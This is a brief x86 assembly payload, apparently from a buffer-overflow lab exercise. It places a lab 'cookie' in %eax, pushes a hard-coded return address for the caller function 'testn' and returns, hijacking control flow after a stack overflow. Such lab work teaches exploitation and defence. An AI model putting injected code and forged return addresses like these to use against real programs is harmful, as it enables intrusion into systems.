movl $0x7aebe9d2, %eax   #return my cookie to caller function(testn)
subl %esp, %ebp
addl %esp, %ebp
push $0x08048d9b  	 #push correct return address onto stack (testn)
ret  			 #return 
